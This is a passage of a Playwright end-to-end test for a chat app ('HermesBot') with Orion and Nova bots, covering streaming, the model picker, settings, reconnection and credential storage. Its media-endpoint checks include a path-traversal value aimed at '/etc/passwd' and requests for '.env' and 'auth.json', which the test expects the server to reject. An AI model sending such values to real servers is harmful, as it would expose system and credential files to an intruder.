  // One message per turn: while the bot writes, only its working line shows; the video comes with the reply.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test média en direct')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.working-row .working-caption').waitFor({ timeout: 5_000 })
  await delay(600)
  if (await page.locator('.message.is-streaming').count()) throw new Error('Une réponse en cours d’écriture ne doit plus avoir de bulle.')
  await page.locator('.message-assistant').getByText('Et la suite du texte.').waitFor({ timeout: 6_000 })
  if (await page.locator('.message-assistant').filter({ hasText: 'Et la suite du texte.' }).locator('video.media-video').count() !== 1) throw new Error('La vidéo doit arriver une fois, avec la réponse.')
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })

  // The bot's steps fold into the working line: its caption follows them, and only the reply stays in the thread.
  const stepsBefore = await page.locator('.message-assistant').count()
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test étapes')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.working-caption').getByText('Lance une commande').waitFor({ timeout: 3_000 })
  await page.locator('.working-row .live-avatar.is-working').waitFor({ timeout: 2_000 })
  if (await page.locator('.messages-column').getByText('Je regarde le code.').count()) throw new Error('Une étape du bot est restée dans le fil.')
  await page.locator('.working-caption').getByText('Je regarde le code.').waitFor({ timeout: 6_000 })
  await page.locator('.working-row').screenshot({ path: `${SCREENSHOTS}working-line.png` })
  await page.locator('.message-assistant').getByText('Les tests passent.').waitFor({ timeout: 8_000 })
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })
  if (await page.locator('.message-assistant').count() !== stepsBefore + 1) throw new Error('Un tour avec étapes doit laisser un seul message du bot.')
  if (await page.locator('.messages-column').getByText('Je regarde le code.').count()) throw new Error('L’étape est réapparue à la fin du tour.')
  if (await page.locator('.details-panel').isVisible()) {
    await page.locator('.details-panel').getByRole('tab', { name: /Activité/ }).click()
    await page.locator('.details-panel').screenshot({ path: `${SCREENSHOTS}details-activity.png` })
    await page.locator('.details-panel').getByRole('tab', { name: 'Routines' }).click()
  }

  // A NOREPLY typed letter by letter never appears in the thread, even during streaming.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test silence')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  for (let probe = 0; probe < 20; probe += 1) {
    if (await page.locator('.messages-column').evaluate((column) => /NOREPLY|NO(?!n)\b/.test(column.innerText.split('Test silence').pop() || ''))) {
      throw new Error('Un NOREPLY en streaming est visible.')
    }
    await delay(60)
  }
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })

  // /api/media over HTTP: session required, extensions and paths filtered, exact Range, strict headers.
  const sessionCookie = (await page.context().cookies('http://127.0.0.1:4332')).map((cookie) => `${cookie.name}=${cookie.value}`).join('; ')
  const media = (query, headers = {}) => fetch(`http://127.0.0.1:4332/api/media?${new URLSearchParams(query)}`, { headers: { Cookie: sessionCookie, ...headers } })
  if ((await fetch('http://127.0.0.1:4332/api/media?profile=orion&path=%2FUsers%2Ftest%2Fvideos%2Fvideo.mp4')).status !== 401) throw new Error('/api/media répond sans session.')
  for (const [query, status] of [
    [{ profile: 'orion', path: '/Users/test/.env' }, 415],
    [{ profile: 'orion', path: '/Users/test/auth.json' }, 415],
    [{ profile: 'orion', path: '/Users/test/logo.svg' }, 415],
    [{ profile: 'orion', path: '/Users/test/../../etc/passwd.png' }, 400],
    [{ profile: 'orion', path: 'relatif/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels.png/' }, 400],
    [{ profile: 'orion', path: '//hote/partage/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/./test/slide.png' }, 400],
    [{ profile: '../orion', path: '/Users/test/videos/video.mp4' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels/absent.jpg' }, 404],
  ]) {
    const result = await media(query)
    await result.arrayBuffer()
    if (result.status !== status) throw new Error(`/api/media ${JSON.stringify(query)} : HTTP ${result.status} au lieu de ${status}`)
  }
  const partial = await media({ profile: 'orion', path: '/Users/test/videos/video.mp4' }, { Range: 'bytes=0-99' })
  const partialBytes = (await partial.arrayBuffer()).byteLength
  if (partial.status !== 206 || partial.headers.get('content-range') !== `bytes 0-99/${VIDEO_SIZE}` || partialBytes !== 100) {
    throw new Error(`Range vidéo mal relayé : ${partial.status} ${partial.headers.get('content-range')} ${partialBytes} octets`)
  }
  const image = await media({ profile: 'orion', path: '/Users/test/visuels/slide-02.png' })
  await image.arrayBuffer()
  if (image.status !== 200 || image.headers.get('content-type') !== 'image/png'
    || /attachment/i.test(image.headers.get('content-disposition') || '')
    || !/sandbox/.test(image.headers.get('content-security-policy') || '')
    || image.headers.get('x-content-type-options') !== 'nosniff') throw new Error('En-têtes de l’image relayée incorrects.')
  await page.getByRole('tab', { name: /Activité/ }).click()
  // History and "Test silence": two silences, both filed under Activité.
  await page.locator('.activity-row').getByText('NOREPLY').first().waitFor()
  await page.locator('.activity-row').getByText('Background process').first().waitFor()
  await page.locator('.activity-row').getByText('Délégation terminée').first().waitFor()
  if (await page.locator('.activity-row').getByText('demande entre bots').count()) throw new Error('Un message entre bots est resté dans Activité.')
  await page.getByRole('tab', { name: /Routines/ }).click()

  // Messages between bots: "Nova messaged Orion", "Orion messaged Nova", "Nova replied to Orion".
  const notes = page.locator('.messages-scroll .agent-note')
  await notes.first().waitFor({ timeout: 5_000 })
  const noteLines = await notes.locator('.agent-note-line').evaluateAll((lines) => lines.map((line) => [...line.children].filter((child) => child.tagName !== 'TIME').map((child) => child.textContent.trim()).join(' ')))
  for (const expected of ['Nova messaged Orion', 'Orion messaged Nova', 'Nova replied to Orion']) {
    if (!noteLines.includes(expected)) throw new Error(`Ligne « ${expected} » absente : ${JSON.stringify(noteLines)}`)
  }
  if (await page.locator('.messages-scroll').getByText('Peux-tu relire').count()) throw new Error('Le message entre bots doit rester fermé.')
  const sentNote = notes.filter({ hasText: 'Orion messaged Nova' })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body strong').getByText('plan').waitFor()
  await sentNote.locator('.agent-note-body').getByText('Reply needed: Un OK écrit').waitFor()
  await notes.filter({ hasText: 'Nova replied to Orion' }).getByRole('button', { name: 'replied to' }).click()
  await page.locator('.agent-note-body').getByText('Plan relu, OK écrit.').waitFor()
  await page.locator('.agent-note-body .cited-files img.media-image').waitFor({ timeout: 5_000 })
  // An upward gesture detaches the thread from the bottom, like a user scrolling up.
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await notes.first().evaluate((element) => element.scrollIntoView({ block: 'start' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}agent-messages.png` })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body').waitFor({ state: 'detached' })
  // Live: a `message_agent` call, then a turn started by another bot's message.
  const notesBefore = await notes.count()
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.complete', { tool_id: 'tool-live-dm', name: 'message_agent' }))
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-dm', display_kind: 'internal_notification', text: 'Message from 🤖 Nova (@nova): Réveil en direct' }))
    send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-dm', text: 'Bien reçu, Nova.', status: 'complete' }))
  }
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor({ timeout: 5_000 })
  if (await notes.count() !== notesBefore + 2) throw new Error(`Messages entre bots en direct : ${await notes.count() - notesBefore} au lieu de 2`)
  await notes.last().getByRole('button', { name: 'messaged' }).click()
  await notes.last().locator('.agent-note-body').getByText('Réveil en direct').waitFor()
  await notes.filter({ hasText: 'Orion messaged Nova' }).locator('.agent-note-name').filter({ hasText: 'Nova' }).last().click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test de streaming')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  try {
    // The simulated gateway gives every turn the same id, so this reply normally reuses the bubble of an earlier
    // turn of this chat. When the background refresh of the chat ran first, that bubble has another id and the
    // reply gets a bubble of its own: one or two matches are both right.
    await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').last().waitFor({ timeout: 10_000 })
    await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  } catch (error) {
    console.log('chat au moment de l’échec:', await page.locator('.messages-column').innerText())
    console.log('notice:', await page.locator('.toast').allTextContents())
    throw error
  }
  await page.locator('.routine-row').waitFor({ timeout: 5_000 })
  const routines = await page.locator('.routine-row').count()
  if (routines !== 1) throw new Error(`Routines: ${routines} au lieu de 1`)

  const rosterCallsBeforeSwitch = profilesListCalls
  await page.locator('[data-bot=nova]').click()
  await page.locator('.message-assistant').getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').first().waitFor()
  if (profilesListCalls !== rosterCallsBeforeSwitch) throw new Error('Cache: un changement de bot a relu le roster.')
  // Typing right after choosing a bot writes to it, without a second click in the field.
  await page.keyboard.type('Direct')
  if (await page.getByRole('textbox', { name: 'Message à Orion' }).inputValue() !== 'Direct') throw new Error('Le champ de saisie ne prend pas le clavier à l’ouverture d’un bot.')
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('')

  if (await page.locator('.usage-readout').count()) throw new Error('Contexte et tok/s doivent être masqués par défaut.')
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()
  await page.locator('.usage-readout').getByText('Contexte 4 % (41k/1M) · 63 tok/s').waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()

  const promptsBeforeCommand = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('/model sonnet')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  if (promptCalls !== promptsBeforeCommand) throw new Error('/model a été envoyé au bot.')
  if (await page.locator('.model-option[data-model="claude-opus-5-5"]').count()) throw new Error('/model sonnet ne filtre pas.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  if (await page.locator('.model-option[data-model="modele-interdit"]').count()) throw new Error('Fournisseur non connecté proposé.')
  if (await page.locator('.model-option[data-model="hidden-model"]').count()) throw new Error('Un fournisseur masqué par les réglages doit être retiré du sélecteur.')
  page.once('dialog', (dialog) => dialog.accept())
  // The active model's group is open, the others are collapsed; collapsing persists between launches.
  const kimiGroup = page.locator('.model-group', { hasText: 'Kimi' })
  const anthropicGroup = page.locator('.model-group', { hasText: 'Anthropic' })
  if (!await anthropicGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le groupe du modèle actif doit être ouvert.')
  if (await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Les autres fournisseurs doivent être pliés.')
  // The real logos pass the app's CSP; all local servers form a single group with no brand logo.
  await page.waitForFunction(() => {
    const logos = [...document.querySelectorAll('.model-group-tile.has-logo img')]
    return logos.length === 2 && logos.every((logo) => logo.complete && logo.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  const localGroup = page.locator('.model-group', { hasText: 'Local LLM' })
  if (await localGroup.count() !== 1) throw new Error('Les modèles locaux doivent être réunis sous Local LLM.')
  if (await localGroup.locator('.model-group-count').innerText() !== '2') throw new Error('Local LLM doit réunir oMLX et LM Studio.')
  if (await localGroup.locator('.model-group-tile.is-local svg').count() !== 1 || await localGroup.locator('img').count()) throw new Error('Local LLM doit garder son icône neutre.')
  if (await page.locator('.model-group-name', { hasText: /oMLX|LM Studio/ }).count()) throw new Error('Le nom du serveur local ne doit plus être affiché.')
  await kimiGroup.locator('.model-group-head').click()
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.waitForTimeout(400)
  const startTheme = await page.evaluate(() => document.documentElement.dataset.theme)
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-light.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(600)
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-dark.png` })
  await page.evaluate((theme) => { document.documentElement.dataset.theme = theme }, startTheme)
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('Escape')
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.waitForTimeout(400)
  if (!await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le pliage doit être mémorisé.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('ArrowUp')
  await kimiGroup.locator('.model-group-head').click()
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('k3.1')
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').click()
  await page.locator('.model-chip').getByText('Sonnet 5.5').waitFor({ timeout: 5_000 })
  const lastMutation = modelMutations.at(-1)
  if (modelMutations.length !== 2) throw new Error(`session.mutate: ${modelMutations.length} appels au lieu de 2`)
  if (lastMutation?.expected_revision !== 4 || lastMutation?.expected_generation !== 1) throw new Error(`Clôtures inattendues: ${JSON.stringify(lastMutation)}`)
  if (lastMutation?.payload?.model !== 'claude-sonnet-5-5' || lastMutation?.payload?.provider !== 'anthropic' || lastMutation?.payload?.confirm !== 'confirm-test') throw new Error(`Mutation inattendue: ${JSON.stringify(lastMutation)}`)
  if (!lastMutation?.request_id || lastMutation.request_id === modelMutations[0].request_id) throw new Error('La confirmation doit avoir une nouvelle request_id.')
  if (!routeChecks.some((check) => check.profile === 'orion' && check.provider === 'anthropic')) throw new Error(`La route doit être vérifiée avant le changement: ${JSON.stringify(routeChecks)}`)

  // A provider with no usable key is marked in the picker, and choosing it asks first: refused, nothing is switched.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('/model gemma')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  const noKeyRow = page.locator('.model-option[data-model="gemma-local"]')
  await noKeyRow.locator('.model-option-tag.is-unusable').getByText('Sans clé').waitFor({ timeout: 5_000 })
  const routeDialog = new Promise((resolve) => page.once('dialog', (dialog) => { resolve(dialog.message()); void dialog.dismiss() }))
  await noKeyRow.click()
  const routeMessage = await routeDialog
  if (!String(routeMessage).includes('No usable credentials found for lmstudio.')) throw new Error(`Avertissement de route inattendu: ${routeMessage}`)
  await page.waitForTimeout(300)
  if (modelMutations.length !== 2) throw new Error('Un changement refusé vers une route sans clé a été envoyé.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('Escape')
  await page.locator('.model-chip').getByText('Sonnet 5.5').waitFor({ timeout: 3_000 })

  // Settings: theme, text, send key, then a hidden model leaves the picker and comes back in one click.
  const openSettings = async () => {
    await page.getByRole('button', { name: 'Réglages', exact: true }).click()
    await settingsDialog.waitFor({ timeout: 3_000 })
  }
  const settingsDialog = page.getByRole('dialog', { name: 'Réglages' })
  await openSettings()
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-general.png` })
  await settingsDialog.getByRole('radio', { name: 'Sombre' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await settingsDialog.getByRole('radio', { name: 'Clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')
  await settingsDialog.getByRole('radio', { name: 'Grande' }).click()
  const largeText = await page.locator('.composer textarea').first().evaluate((element) => getComputedStyle(element).fontSize)
  if (largeText !== '16px') throw new Error(`Taille du texte non appliquée : ${largeText}`)
  await settingsDialog.getByRole('radio', { name: 'Normale' }).click()
  // Test notification: the same kind as a bot's, then what macOS did with it.
  const sentBeforeTest = (await notificationsSent()).length
  await settingsDialog.getByRole('button', { name: 'Envoyer', exact: true }).click()
  for (let wait = 0; wait < 20 && (await notificationsSent()).length === sentBeforeTest; wait++) await page.waitForTimeout(50)
  const testSent = (await notificationsSent()).slice(sentBeforeTest)
  if (testSent.length !== 1 || testSent[0].tag !== 'hermesbot-test' || testSent[0].title !== 'HermesBot') throw new Error(`Notification de test : ${JSON.stringify(testSent)}`)
  await page.evaluate(() => window.__notifications.at(-1).onshow?.())
  await settingsDialog.getByText('Envoyée. Rien à l’écran ?', { exact: false }).waitFor({ timeout: 3_000 })
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: '⌘ Entrée' }).click()
  // The chat guide follows the send key.
  const guideSend = settingsDialog.locator('.chat-guide-item').filter({ hasText: 'Envoyer le message' })
  await guideSend.locator('kbd').nth(0).getByText('⌘').waitFor({ timeout: 2_000 })
  await guideSend.locator('kbd').nth(1).getByText('Entrée').waitFor({ timeout: 2_000 })
  await settingsDialog.locator('.chat-guide-item').filter({ hasText: 'Nouvelle ligne' }).locator('kbd').getByText('Entrée', { exact: true }).waitFor({ timeout: 2_000 })
  await settingsDialog.locator('.chat-guide').scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}settings-chat-guide.png` })
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  if (await page.locator('.composer-hint-keys').count()) throw new Error('Plus de texte d’aide sous le champ de saisie quand le bot est au repos.')
  const promptsBeforeKeys = promptCalls
  const composerField = page.getByRole('textbox', { name: 'Message à Orion' })
  await composerField.fill('une ligne')
  await composerField.press('Enter')
  if (promptCalls !== promptsBeforeKeys || !(await composerField.inputValue()).includes('\n')) throw new Error('Avec ⌘ Entrée, Entrée doit aller à la ligne sans envoyer.')
  await composerField.fill('')
  await openSettings()
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: 'Entrée', exact: true }).click()
  await settingsDialog.getByRole('button', { name: 'Modèles' }).click()
  const settingsSearch = settingsDialog.getByRole('textbox', { name: 'Rechercher dans les modèles' })
  await settingsSearch.fill('kimi k3')
  await settingsDialog.locator('.settings-model[data-model="kimi-k3"] input').uncheck()
  await settingsSearch.fill('sonnet')
  await settingsDialog.locator('.settings-model[data-model="claude-sonnet-5-5"] input').uncheck()
  await settingsSearch.fill('')
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('kimi')
  await page.locator('.model-option[data-model="kimi-for-coding"]').waitFor({ timeout: 3_000 })
  if (await page.locator('.model-option[data-model="kimi-k3"]').count()) throw new Error('Un modèle masqué reste proposé.')
  await page.getByRole('button', { name: 'Gérer les modèles' }).click()
  await settingsDialog.waitFor({ timeout: 3_000 })
  await settingsDialog.locator('.settings-model-toggle', { hasText: 'Anthropic' }).click()
  await settingsDialog.locator('.settings-model[data-model="claude-fable-5-2"]').waitFor({ timeout: 3_000 })
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(400)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  // Every change goes to the gateway's shared file, read by the iPhone app.
  const sharedHidden = () => JSON.parse(sharedSettingsFile).hiddenModels
  for (let wait = 0; wait < 20 && !sharedHidden().some((key) => key.endsWith(':kimi-k3')); wait++) await page.waitForTimeout(100)
  if (!sharedHidden().some((key) => key.endsWith(':kimi-k3')) || !sharedHidden().includes('custom:omlx:qwen-masque')) throw new Error(`Modèles masqués non partagés : ${sharedSettingsFile}`)
  await settingsDialog.getByRole('button', { name: 'Tout afficher' }).click()
  // Only the listed models come back: a model hidden elsewhere and absent here stays hidden.
  const onlyForeign = () => sharedHidden().length === 1 && sharedHidden()[0] === 'custom:omlx:qwen-masque'
  for (let wait = 0; wait < 20 && !onlyForeign(); wait++) await page.waitForTimeout(100)
  if (!onlyForeign()) throw new Error(`« Tout afficher » non partagé : ${sharedSettingsFile}`)
  const savedSettings = await page.evaluate(() => JSON.parse(localStorage.getItem('hermesbot-settings')))
  if (savedSettings.hiddenModels.join() !== 'custom:omlx:qwen-masque' || savedSettings.sendKey !== 'enter' || savedSettings.textSize !== 'normal') throw new Error(`Réglages mal enregistrés : ${JSON.stringify(savedSettings)}`)
  await settingsDialog.getByRole('button', { name: 'Fermer les réglages' }).click()
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })

  // Caveman mode: one switch for every bot. The note is read with the turn, after the mode instruction;
  // the stored text stays the user's, and an approved mail still goes out with nothing added.
  const setCaveman = async (on) => {
    await openSettings()
    await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
    const cavemanSwitch = settingsDialog.getByRole('switch', { name: /Mode caveman/ })
    if (await cavemanSwitch.isChecked() === on) throw new Error(`Le mode caveman devrait être ${on ? 'coupé' : 'actif'} avant le clic.`)
    await cavemanSwitch.setChecked(on)
    if (on) {
      await page.waitForTimeout(350)
      await page.screenshot({ path: `${SCREENSHOTS}settings-caveman.png` })
    }
    await settingsDialog.getByRole('button', { name: 'Fermer les réglages' }).click()
    await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  }
  const CAVEMAN_NOTE = '[HermesBot style: caveman. For this turn only,'
  await setCaveman(true)
  await sendInMode('Test caveman')
  if (!lastApiText?.startsWith(`Test caveman\n\n${CAVEMAN_NOTE}`) || !lastApiText.includes('messages to others stay normal')) throw new Error(`api_text caveman : ${lastApiText}`)
  if (await page.locator('.messages-scroll').getByText('HermesBot style').count()) throw new Error('La note caveman est visible.')
  await modeRadio('BRAIN').click()
  await sendInMode('Test caveman brain')
  const brainAt = lastApiText?.indexOf('[HermesBot mode: BRAIN.') ?? -1
  if (brainAt < 0 || lastApiText.indexOf(CAVEMAN_NOTE) < brainAt) throw new Error(`La note caveman doit suivre la consigne du mode : ${lastApiText}`)
  await modeRadio('EXEC').click()
  await askMail('m3')
  await card.waitFor({ timeout: 5_000 })
  if (!lastApiText?.includes(CAVEMAN_NOTE)) throw new Error('La demande de mail part du champ de saisie : elle porte la note caveman.')
  const promptsBeforeCavemanMail = promptCalls
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeCavemanMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeCavemanMail + 1 || !lastPromptText.includes('Id: m3')) throw new Error('Le mail approuvé en mode caveman doit lancer un seul tour.')
  if (lastApiText !== undefined) throw new Error(`Un mail validé ne doit pas porter la note caveman : ${lastApiText}`)
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.composer-send[aria-label="Envoyer"]').waitFor({ state: 'attached', timeout: 3_000 })
  await delay(500) // the simulated turn ends: the next send would be ignored while it runs
  await setCaveman(false)
  await sendInMode('Test sans caveman')
  if (lastApiText !== undefined) throw new Error(`Mode caveman coupé : rien ne doit être ajouté : ${lastApiText}`)

  // A real user gesture (wheel up) detaches the thread; a programmatic scroll would not.
  const scrollBox = await page.locator('.messages-scroll').boundingBox()
  await page.mouse.move(scrollBox.x + scrollBox.width / 2, scrollBox.y + scrollBox.height / 2)
  await page.mouse.wheel(0, -40_000)
  await page.waitForFunction(() => document.querySelector('.messages-scroll').scrollTop < 5, null, { timeout: 5_000 })
  await delay(200)
  const scrolledTo = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test pendant lecture')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await delay(600)
  const scrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (scrollTop !== scrolledTo) throw new Error(`Le scroll a été déplacé pendant la réponse: ${scrolledTo} → ${scrollTop}`)
  // Jump button: icon only, round, and the jump is instant (no smooth scroll to wait for).
  const jump = page.getByRole('button', { name: 'Nouveaux messages' })
  const jumpBox = await jump.boundingBox()
  if (!jumpBox || jumpBox.width < 38 || Math.abs(jumpBox.width - jumpBox.height) > 1) throw new Error(`Le bouton du bas doit être un rond d’environ 40 px : ${JSON.stringify(jumpBox)}`)
  if ((await jump.innerText()).trim()) throw new Error('Le bouton du bas ne doit plus porter de texte.')
  await jump.click()
  await delay(50)
  const jumpedAtBottom = await page.locator('.messages-scroll').evaluate((element) => element.scrollHeight - element.scrollTop - element.clientHeight)
  if (jumpedAtBottom > 40) throw new Error(`Le bouton du bas n’a pas amené tout en bas, instantanément (reste ${jumpedAtBottom} px).`)
  if (await page.locator('.jump-latest').count()) throw new Error('Le bouton du bas doit disparaître une fois en bas.')

  // Abrupt gateway cut (code 1006): the server must survive, then sending must resume.
  for (const client of wss.clients) client.terminate()
  await delay(500)
  if (!(await fetch('http://127.0.0.1:4332/api/health')).ok) throw new Error('Le serveur est tombé sur une fermeture 1006.')
  const promptsBeforeReconnect = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Après coupure')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.getByText('Après coupure').first().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && promptCalls === promptsBeforeReconnect; attempt += 1) await delay(100)
  if (promptCalls === promptsBeforeReconnect) throw new Error('Envoi perdu après reconnexion.')
  await delay(400)

  // Reconnect button: visible status, recovery without reloading the page, open chat resubscribed.
  const refresh = page.getByRole('button', { name: 'Reconnecter Hermes' })
  const connection = page.locator('.connection-label')

  // Dropped gateway: back on its own, without a click, with the open chat resubscribed.
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  const resumesBeforeDrop = sessionResumeCalls
  for (const client of wss.clients) client.terminate()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 8_000 })
  for (let attempt = 0; attempt < 50 && sessionResumeCalls === resumesBeforeDrop; attempt += 1) await delay(100)
  if (sessionResumeCalls === resumesBeforeDrop) throw new Error('Reconnexion automatique : chat ouvert non réabonné.')
  await delay(500)
  // Gateway still away: the automatic attempts fail and the status stays "déconnecté" until the click.
  forcedAuthStatus = 503
  for (const client of wss.clients) client.terminate()
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 5_000 })
  forcedAuthStatus = 0
  const resumesBeforeRefresh = sessionResumeCalls
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && sessionResumeCalls === resumesBeforeRefresh; attempt += 1) await delay(100)
  if (sessionResumeCalls === resumesBeforeRefresh) throw new Error('Le chat ouvert n’a pas été réabonné après reconnexion.')
  await refresh.click() // socket still open: must be replaced, not doubled
  await delay(500)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (wss.clients.size !== 1) throw new Error(`Sockets ouverts après reconnexion : ${wss.clients.size} au lieu de 1.`)
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-retour', text: 'Reçu après reconnexion.', status: 'complete' }))
  await page.locator('.message-assistant').getByText('Reçu après reconnexion.').waitFor({ timeout: 3_000 })

  // Unreachable gateway: clear message, then recovery on the next click.
  forcedAuthStatus = 503
  await refresh.click()
  await page.locator('.toast').getByText('Hermes ne répond pas').waitFor({ timeout: 5_000 })
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 2_000 })
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}hermes-disconnected.png` })
  forcedAuthStatus = 0
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message d’erreur reste affiché après reconnexion.')

  // Credentials kept server-side, never in the browser.
  if (JSON.parse(readFileSync(SAVED_LOGIN_FILE, 'utf8')).username !== 'test') throw new Error('Identifiants non enregistrés.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage, cookie: document.cookie }).includes('"password"'))) throw new Error('Mot de passe présent dans le navigateur.')

  // Another local process, even with the right Origin, gets nothing without a session cookie.
  const loginsBeforeForged = loginCalls
  const forged = await fetch('http://127.0.0.1:4332/api/auth/restore', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332' } })
  await forged.arrayBuffer()
  if (forged.status !== 404 || forged.headers.get('set-cookie') || loginCalls !== loginsBeforeForged) throw new Error(`Restauration sans cookie acceptée : HTTP ${forged.status}.`)

  // Expired Hermes session: silent reconnection with the stored credentials.
  const loginsBeforeExpiry = loginCalls
  expiredBefore = cookieCounter
  await refresh.click()
  await delay(300)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (loginCalls !== loginsBeforeExpiry + 1) throw new Error(`Reconnexion silencieuse : ${loginCalls - loginsBeforeExpiry} connexions au lieu de 1.`)
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion affiché malgré les identifiants gardés.')

  // Password changed: credentials forgotten, back to the screen, then the same bot resumes.
  expiredBefore = cookieCounter
  loginRefused = true
  await refresh.click()
